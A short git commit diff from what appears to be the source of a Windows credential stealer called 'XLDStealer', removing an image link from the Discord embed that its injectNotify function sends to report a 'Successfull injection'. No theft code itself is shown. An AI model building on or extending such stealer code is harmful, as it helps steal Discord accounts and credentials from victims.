0493fc4c83a7f29734ab5fc35ba609e9237179d5
Archemis <55634571+ugur014@users.noreply.github.com>
2022-04-21 19:36:52 +0000

    Update index-win.js

--- src/Undetected/index-win.js
+++ src/Undetected/index-win.js
@@ -173,7 +173,6 @@ function injectNotify() {
             "title": "<:bfdnonsfw:966774651449671761> Successfull injection",
             "color": "#E70000",
             "fields": fields,
-            "image": "https://media.discordapp.net/attachments/962421775361273910/966779841204596766/IMG-20220421-WA0062.jpg",
             "author": {
               "name": "XLDStealer"
             },
